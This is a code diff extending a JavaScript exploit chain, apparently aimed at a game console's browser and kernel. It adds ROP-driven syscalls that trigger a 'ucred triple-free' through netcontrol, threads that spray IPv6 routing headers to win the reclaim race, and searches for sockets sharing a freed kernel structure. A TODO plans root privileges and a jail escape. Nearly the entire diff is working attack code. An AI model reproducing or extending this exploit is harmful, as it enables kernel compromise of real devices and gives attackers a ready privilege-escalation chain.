@@ -35,8 +35,8 @@ make_uaf(uaf_arr)
 log('Achieved UAF !!')
 
 log('Spraying arrays with marker...')
-// spray candidates arrays to be used as leak primitive
-var spray = new Array(0x1000)
+// spray candidates arrays to be used as leak primitive (reduced for stability)
+var spray = new Array(0x800)
 for (var i = 0; i < spray.length; i++) {
   spray[i] = [prim_marker.jsv().d(), {}]
 }
@@ -260,7 +260,7 @@ log(`eboot_addr: ${eboot_addr}`)
 
 // Disable GC by patching JSC global variable
 // disableGC offset: 0x2275B20 (Ghidra) - 0x400000 (image base) = 0x1E75B20
-var DISABLE_GC_OFFSET = 0x1E75B20
+// DISABLE_GC_OFFSET now in globals.js
 var disable_gc_addr = base_addr.add(new BigInt(0, DISABLE_GC_OFFSET))
 var gc_old_value = mem.read4(disable_gc_addr)
 log('[GC] Current disableGC: ' + gc_old_value.toString())
@@ -725,7 +725,16 @@ try {
       kqueue_found: false,
       getuid_lo: 0,
       getuid_hi: 0,
-      getuid_found: false
+      getuid_found: false,
+      netcontrol_lo: 0,
+      netcontrol_hi: 0,
+      netcontrol_found: false,
+      thr_new_lo: 0,
+      thr_new_hi: 0,
+      thr_new_found: false,
+      thr_exit_lo: 0,
+      thr_exit_hi: 0,
+      thr_exit_found: false
     }
 
     for (var f = 0; f < found_count; f++) {
@@ -801,6 +810,18 @@ try {
         kapi.kqueue_lo = lo
         kapi.kqueue_hi = hi
         kapi.kqueue_found = true
+      } else if (syscall_num === 0x63) {
+        kapi.netcontrol_lo = lo
+        kapi.netcontrol_hi = hi
+        kapi.netcontrol_found = true
+      } else if (syscall_num === 0x1C7) {
+        kapi.thr_new_lo = lo
+        kapi.thr_new_hi = hi
+        kapi.thr_new_found = true
+      } else if (syscall_num === 0x1CE) {
+        kapi.thr_exit_lo = lo
+        kapi.thr_exit_hi = hi
+        kapi.thr_exit_found = true
       }
     }
 
@@ -871,12 +892,13 @@ log('')
 log('=== NetControl Kernel Exploit ===')
 
 // Check required syscalls
-if (!kapi.socket_found || !kapi.setsockopt_found || !kapi.getsockopt_found || !kapi.close_found) {
+if (!kapi.socket_found || !kapi.setsockopt_found || !kapi.getsockopt_found || !kapi.close_found || !kapi.netcontrol_found) {
   log('ERROR: Required syscalls not found')
   log('  socket: ' + kapi.socket_found)
   log('  setsockopt: ' + kapi.setsockopt_found)
   log('  getsockopt: ' + kapi.getsockopt_found)
   log('  close: ' + kapi.close_found)
+  log('  netcontrol: ' + kapi.netcontrol_found)
 } else {
   log('All required syscalls found')
 
@@ -1087,7 +1109,403 @@ if (!kapi.socket_found || !kapi.setsockopt_found || !kapi.getsockopt_found || !k
     mem.free(readback_len_buf)
   }
 
+  // Trigger NetControl vulnerability (ucred triple-free)
+  log('')
+  log('[NETCONTROL] Triggering ucred triple-free...')
+
+  var netcontrol_wrapper = new BigInt(kapi.netcontrol_hi, kapi.netcontrol_lo)
+  var netcontrol_buf = mem.malloc(8)
+  var setuid_wrapper = new BigInt(kapi.setuid_hi, kapi.setuid_lo)
+
+  // Create dummy socket for NetControl registration
+  var dummy_store_addr = mem.malloc(0x100)
+  var dummy_insts = build_rop_chain(
+    new BigInt(kapi.socket_hi, kapi.socket_lo),
+    new BigInt(0, AF_INET6),
+    new BigInt(0, SOCK_STREAM),
+    new BigInt(0, 0)
+  )
+  rop.store(dummy_insts, dummy_store_addr, 1)
+  rop.execute(dummy_insts, dummy_store_addr, 0x10)
+  var dummy_fd = mem.read8(dummy_store_addr.add(new BigInt(0, 8)))
+  mem.free(dummy_store_addr)
+
+  log('[NETCONTROL] Created dummy socket fd=' + dummy_fd.lo())
+
+  // Write socket fd to buffer for netcontrol
+  mem.write4(netcontrol_buf, dummy_fd)
+
+  // Call __sys_netcontrol with SET_QUEUE
+  var setqueue_store_addr = mem.malloc(0x100)
+  var setqueue_insts = build_rop_chain(
+    netcontrol_wrapper,
+    new BigInt(0xFFFFFFFF, 0xFFFFFFFF), // ifindex = -1
+    new BigInt(0, NET_CONTROL_NETEVENT_SET_QUEUE),
+    netcontrol_buf,
+    new BigInt(0, 8)
+  )
+  rop.store(setqueue_insts, setqueue_store_addr, 1)
+  rop.execute(setqueue_insts, setqueue_store_addr, 0x10)
+  var setqueue_ret = mem.read8(setqueue_store_addr.add(new BigInt(0, 8)))
+  mem.free(setqueue_store_addr)
+
+  log('[NETCONTROL] SET_QUEUE returned: ' + setqueue_ret.lo())
+
+  // Close dummy socket
+  var close_dummy_store_addr = mem.malloc(0x100)
+  var close_dummy_insts = build_rop_chain(
+    new BigInt(kapi.close_hi, kapi.close_lo),
+    dummy_fd
+  )
+  rop.store(close_dummy_insts, close_dummy_store_addr, 1)
+  rop.execute(close_dummy_insts, close_dummy_store_addr, 0x10)
+  mem.free(close_dummy_store_addr)
+
+  // Call setuid(1) - first ucred allocation
+  var setuid1_store_addr = mem.malloc(0x100)
+  var setuid1_insts = build_rop_chain(setuid_wrapper, new BigInt(0, 1))
+  rop.store(setuid1_insts, setuid1_store_addr, 1)
+  rop.execute(setuid1_insts, setuid1_store_addr, 0x10)
+  mem.free(setuid1_store_addr)
+
+  // Create UAF socket
+  var uaf_store_addr = mem.malloc(0x100)
+  var uaf_insts = build_rop_chain(
+    new BigInt(kapi.socket_hi, kapi.socket_lo),
+    new BigInt(0, AF_INET6),
+    new BigInt(0, SOCK_STREAM),
+    new BigInt(0, 0)
+  )
+  rop.store(uaf_insts, uaf_store_addr, 1)
+  rop.execute(uaf_insts, uaf_store_addr, 0x10)
+  var uaf_fd = mem.read8(uaf_store_addr.add(new BigInt(0, 8)))
+  mem.free(uaf_store_addr)
+
+  log('[NETCONTROL] Created UAF socket fd=' + uaf_fd.lo())
+
+  // Call setuid(1) - second ucred allocation
+  var setuid2_store_addr = mem.malloc(0x100)
+  var setuid2_insts = build_rop_chain(setuid_wrapper, new BigInt(0, 1))
+  rop.store(setuid2_insts, setuid2_store_addr, 1)
+  rop.execute(setuid2_insts, setuid2_store_addr, 0x10)
+  mem.free(setuid2_store_addr)
+
+  // Call __sys_netcontrol with CLEAR_QUEUE
+  mem.write4(netcontrol_buf, uaf_fd)
+  var clearqueue_store_addr = mem.malloc(0x100)
+  var clearqueue_insts = build_rop_chain(
+    netcontrol_wrapper,
+    new BigInt(0xFFFFFFFF, 0xFFFFFFFF), // ifindex = -1
+    new BigInt(0, NET_CONTROL_NETEVENT_CLEAR_QUEUE),
+    netcontrol_buf,
+    new BigInt(0, 8)
+  )
+  rop.store(clearqueue_insts, clearqueue_store_addr, 1)
+  rop.execute(clearqueue_insts, clearqueue_store_addr, 0x10)
+  var clearqueue_ret = mem.read8(clearqueue_store_addr.add(new BigInt(0, 8)))
+  mem.free(clearqueue_store_addr)
+
+  log('[NETCONTROL] CLEAR_QUEUE returned: ' + clearqueue_ret.lo())
+
+  // Close UAF socket
+  var close_uaf_store_addr = mem.malloc(0x100)
+  var close_uaf_insts = build_rop_chain(
+    new BigInt(kapi.close_hi, kapi.close_lo),
+    uaf_fd
+  )
+  rop.store(close_uaf_insts, close_uaf_store_addr, 1)
+  rop.execute(close_uaf_insts, close_uaf_store_addr, 0x10)
+  mem.free(close_uaf_store_addr)
+
+  mem.free(netcontrol_buf)
+
+  log('[NETCONTROL] Ucred triple-free triggered')
+
+  // Use scePthreadCreate for threading
+  log('[NETCONTROL] Using scePthreadCreate for worker threads')
+
+  // Get scePthreadCreate from libc
+  var pthread_create_addr = libc_addr.add(new BigInt(0, SCE_PTHREAD_CREATE_OFFSET))
+  var pthread_exit_addr = libc_addr.add(new BigInt(0, SCE_PTHREAD_EXIT_OFFSET))
+
+  log('[THREAD] scePthreadCreate at: ' + pthread_create_addr.toString())
+  log('[THREAD] scePthreadExit at: ' + pthread_exit_addr.toString())
+
+  // Pre-allocate shared routing header buffer (reused by all workers)
+  var shared_rthdr_buf = mem.malloc(UCRED_SIZE)
+  var rthdr_len = ((UCRED_SIZE >> 3) - 1) & ~1
+  var rthdr_size = (rthdr_len + 1) << 3
+
+  // Build routing header once (shared by all workers)
+  for (var z = 0; z < UCRED_SIZE; z += 4) {
+    mem.write4(shared_rthdr_buf.add(new BigInt(0, z)), new BigInt(0, 0))
+  }
+  mem.write1(shared_rthdr_buf.add(new BigInt(0, 0)), 0)
+  mem.write1(shared_rthdr_buf.add(new BigInt(0, 1)), rthdr_len)
+  mem.write1(shared_rthdr_buf.add(new BigInt(0, 2)), IPV6_RTHDR_TYPE_0)
+  mem.write1(shared_rthdr_buf.add(new BigInt(0, 3)), (rthdr_len >> 1))
+
+  log('[THREAD] Spawning ' + NUM_WORKER_THREADS + ' worker threads...')
+
+  // Spawn worker threads to spray routing headers
+  for (var w = 0; w < NUM_WORKER_THREADS; w++) {
+    var worker_rop = mem.malloc(0x2000)
+
+    // ROP chain: spray routing headers on sockets (using shared buffer)
+    var worker_rop_arr = []
+
+    // Spray loop - each worker sprays subset of sockets
+    var start_sock = Math.floor(w * (IPV6_SOCK_NUM / NUM_WORKER_THREADS))
+    var end_sock = Math.floor((w + 1) * (IPV6_SOCK_NUM / NUM_WORKER_THREADS))
+
+    for (var i = start_sock; i < end_sock; i++) {
+      // setsockopt(socket, IPPROTO_IPV6, IPV6_RTHDR, buf, size)
+      worker_rop_arr.push(gadgets.POP_RDI_RET)
+      worker_rop_arr.push(new BigInt(0, ipv6_sockets[i]))
+      worker_rop_arr.push(gadgets.POP_RSI_RET)
+      worker_rop_arr.push(new BigInt(0, IPPROTO_IPV6))
+      worker_rop_arr.push(gadgets.POP_RDX_RET)
+      worker_rop_arr.push(new BigInt(0, IPV6_RTHDR))
+      worker_rop_arr.push(gadgets.POP_RCX_RET)
+      worker_rop_arr.push(shared_rthdr_buf)
+      worker_rop_arr.push(gadgets.POP_R8_RET)
+      worker_rop_arr.push(new BigInt(0, rthdr_size))
+      worker_rop_arr.push(new BigInt(kapi.setsockopt_hi, kapi.setsockopt_lo))
+    }
+
+    // scePthreadExit(0)
+    worker_rop_arr.push(gadgets.POP_RDI_RET)
+    worker_rop_arr.push(new BigInt(0, 0))
+    worker_rop_arr.push(pthread_exit_addr)
+
+    // Write ROP chain to buffer
+    for (var r = 0; r < worker_rop_arr.length; r++) {
+      mem.write8(worker_rop.add(new BigInt(0, r * 8)), worker_rop_arr[r])
+    }
+
+    // Setup worker function pointer (points to ROP chain via RET gadget)
+    var worker_func = mem.malloc(0x10)
+    mem.write8(worker_func, gadgets.RET)
+    mem.write8(worker_func.add(new BigInt(0, 8)), worker_rop)
+
+    // Allocate pthread_t storage
+    var pthread_addr = mem.malloc(8)
+
+    // scePthreadCreate(thread, attr, start_routine, arg)
+    var pthread_store = mem.malloc(0x100)
+    var pthread_insts = build_rop_chain(
+      pthread_create_addr,
+      pthread_addr,
+      new BigInt(0, 0), // attr = NULL (default)
+      worker_func,
+      new BigInt(0, 0) // arg = NULL (not needed, ROP chain is self-contained)
+    )
+    rop.store(pthread_insts, pthread_store, 1)
+    rop.execute(pthread_insts, pthread_store, 0x10)
+    mem.free(pthread_store)
+
+    var pthread_id = mem.read8(pthread_addr)
+    log('[THREAD] Worker ' + w + ' spawned, pthread=' + pthread_id.toString())
+  }
+
+  log('[NETCONTROL] Workers racing to reclaim ucred slots...')
+
+  // Wait a bit for workers to complete spray
+  for (var delay = 0; delay < 10000; delay++) {
+    // Busy wait
+  }
+
+  log('[NETCONTROL] Reclaim race completed')
+
+  // Find twins - two sockets sharing the same routing header
+  log('')
+  log('[TWINS] Finding twin sockets sharing same rthdr...')
+
+  var twin1 = -1
+  var twin2 = -1
+  var tag_buf = mem.malloc(UCRED_SIZE)
+  var tag_len_buf = mem.malloc(8)
+
+  // Write unique tags to each socket's routing header
+  var rthdr_len = ((UCRED_SIZE >> 3) - 1) & ~1
+  var rthdr_size = (rthdr_len + 1) << 3
+
+  try {
+    for (var i = 0; i < IPV6_SOCK_NUM; i++) {
+      // Zero buffer
+      for (var z = 0; z < UCRED_SIZE; z += 4) {
+        mem.write4(tag_buf.add(new BigInt(0, z)), new BigInt(0, 0))
+      }
+
+      // Write header
+      mem.write1(tag_buf.add(new BigInt(0, 0)), 0)
+      mem.write1(tag_buf.add(new BigInt(0, 1)), rthdr_len)
+      mem.write1(tag_buf.add(new BigInt(0, 2)), IPV6_RTHDR_TYPE_0)
+      mem.write1(tag_buf.add(new BigInt(0, 3)), (rthdr_len >> 1))
+
+      // Write unique tag at offset 4 (RTHDR_TAG + socket index)
+      var tag_value = RTHDR_TAG + i
+      mem.write4(tag_buf.add(new BigInt(0, 4)), new BigInt(0, tag_value))
+
+      // Set the tagged routing header
+      var setsockopt_wrapper = new BigInt(kapi.setsockopt_hi, kapi.setsockopt_lo)
+      var tag_store_addr = mem.malloc(0x100)
+      var tag_insts = build_rop_chain(
+        setsockopt_wrapper,
+        new BigInt(0, ipv6_sockets[i]),
+        new BigInt(0, IPPROTO_IPV6),
+        new BigInt(0, IPV6_RTHDR),
+        tag_buf,
+        new BigInt(0, rthdr_size)
+      )
+      rop.store(tag_insts, tag_store_addr, 1)
+      rop.execute(tag_insts, tag_store_addr, 0x10)
+      mem.free(tag_store_addr)
+
+      if (i % 40 === 0) {
+        log('[TWINS] Tagged ' + i + '/' + IPV6_SOCK_NUM + ' sockets')
+      }
+    }
+  } catch (e) {
+    log('[TWINS] ERROR during tagging: ' + e.message)
+    mem.free(tag_buf)
+    mem.free(tag_len_buf)
+    throw e
+  }
+
+  // Read back tags to find twins
+  log('[TWINS] Reading back tags to find overlapping structures...')
+  var getsockopt_wrapper = new BigInt(kapi.getsockopt_hi, kapi.getsockopt_lo)
+
+  try {
+    for (var i = 0; i < IPV6_SOCK_NUM; i++) {
+      mem.write4(tag_len_buf, new BigInt(0, UCRED_SIZE))
+
+      var read_store_addr = mem.malloc(0x100)
+      var read_insts = build_rop_chain(
+        getsockopt_wrapper,
+        new BigInt(0, ipv6_sockets[i]),
+        new BigInt(0, IPPROTO_IPV6),
+        new BigInt(0, IPV6_RTHDR),
+        tag_buf,
+        tag_len_buf
+      )
+      rop.store(read_insts, read_store_addr, 1)
+      rop.execute(read_insts, read_store_addr, 0x10)
+      mem.free(read_store_addr)
+
+      // Read the tag at offset 4
+      var read_tag = mem.read4(tag_buf.add(new BigInt(0, 4)))
+      var expected_tag = RTHDR_TAG + i
+
+      if (read_tag.lo() !== expected_tag) {
+        // Found a twin - this socket reads someone else's tag
+        var twin_index = read_tag.lo() - RTHDR_TAG
+        twin1 = i
+        twin2 = twin_index
+        log('[TWINS] Found twins: socket[' + twin1 + '] and socket[' + twin2 + '] share rthdr (tag: 0x' + read_tag.lo().toString(16) + ')')
+        break
+      }
+
+      if (i % 40 === 0) {
+        log('[TWINS] Checked ' + i + '/' + IPV6_SOCK_NUM + ' sockets')
+      }
+    }
+  } catch (e) {
+    log('[TWINS] ERROR during readback: ' + e.message)
+    mem.free(tag_buf)
+    mem.free(tag_len_buf)
+    throw e
+  }
+
+  mem.free(tag_buf)
+  mem.free(tag_len_buf)
+
+  if (twin1 === -1) {
+    log('[TWINS] ERROR: No twins found')
+  } else {
+    // Find triplet - third socket sharing same rthdr
+    log('[TRIPLET] Finding third socket sharing same rthdr...')
+
+    var triplet = -1
+    var triplet_buf = mem.malloc(UCRED_SIZE)
+    var triplet_len_buf = mem.malloc(8)
+
+    // Write unique tag to twin1
+    for (var z = 0; z < UCRED_SIZE; z += 4) {
+      mem.write4(triplet_buf.add(new BigInt(0, z)), new BigInt(0, 0))
+    }
+
+    var rthdr_len = ((UCRED_SIZE >> 3) - 1) & ~1
+    var rthdr_size = (rthdr_len + 1) << 3
+    mem.write1(triplet_buf.add(new BigInt(0, 0)), 0)
+    mem.write1(triplet_buf.add(new BigInt(0, 1)), rthdr_len)
+    mem.write1(triplet_buf.add(new BigInt(0, 2)), IPV6_RTHDR_TYPE_0)
+    mem.write1(triplet_buf.add(new BigInt(0, 3)), (rthdr_len >> 1))
+    mem.write4(triplet_buf.add(new BigInt(0, 4)), new BigInt(0, 0xdeadbeef))
+
+    var set_store_addr = mem.malloc(0x100)
+    var set_insts = build_rop_chain(
+      new BigInt(kapi.setsockopt_hi, kapi.setsockopt_lo),
+      new BigInt(0, ipv6_sockets[twin1]),
+      new BigInt(0, IPPROTO_IPV6),
+      new BigInt(0, IPV6_RTHDR),
+      triplet_buf,
+      new BigInt(0, rthdr_size)
+    )
+    rop.store(set_insts, set_store_addr, 1)
+    rop.execute(set_insts, set_store_addr, 0x10)
+    mem.free(set_store_addr)
+
+    // Read from all other sockets
+    for (var i = 0; i < IPV6_SOCK_NUM; i++) {
+      if (i === twin1 || i === twin2) {
+        continue
+      }
+
+      mem.write4(triplet_len_buf, new BigInt(0, UCRED_SIZE))
+
+      var get_store_addr = mem.malloc(0x100)
+      var get_insts = build_rop_chain(
+        new BigInt(kapi.getsockopt_hi, kapi.getsockopt_lo),
+        new BigInt(0, ipv6_sockets[i]),
+        new BigInt(0, IPPROTO_IPV6),
+        new BigInt(0, IPV6_RTHDR),
+        triplet_buf,
+        triplet_len_buf
+      )
+      rop.store(get_insts, get_store_addr, 1)
+      rop.execute(get_insts, get_store_addr, 0x10)
+      mem.free(get_store_addr)
+
+      var read_tag = mem.read4(triplet_buf.add(new BigInt(0, 4)))
+      if (read_tag.lo() === 0xdeadbeef) {
+        triplet = i
+        log('[TRIPLET] Found triplet: socket[' + triplet + '] shares rthdr with twins')
+        break
+      }
+    }
+
+    mem.free(triplet_buf)
+    mem.free(triplet_len_buf)
+
+    if (triplet === -1) {
+      log('[TRIPLET] ERROR: No triplet found')
+    } else {
+      log('[TRIPLET] Success - we have 3 sockets sharing same kernel rthdr structure')
+      log('[TRIPLET] Master: socket[' + twin1 + '], Twin: socket[' + twin2 + '], Triplet: socket[' + triplet + ']')
+    }
+  }
+
   // Cleanup
   mem.free(rthdr_buf)
   mem.free(optlen_buf)
 }
+
+// ============================================================================
+// TODO - Next stages:
+// STAGE 4: Leak kqueue structure via triplet to get kernel addresses
+// STAGE 5: Build kernel R/W primitives using pipe buffer corruption
+// STAGE 6: Find allproc, patch ucred (root + escape jail + full caps)
+// STAGE 7: Post-jailbreak (load modules, enable debug, dump kernel)
+// ============================================================================
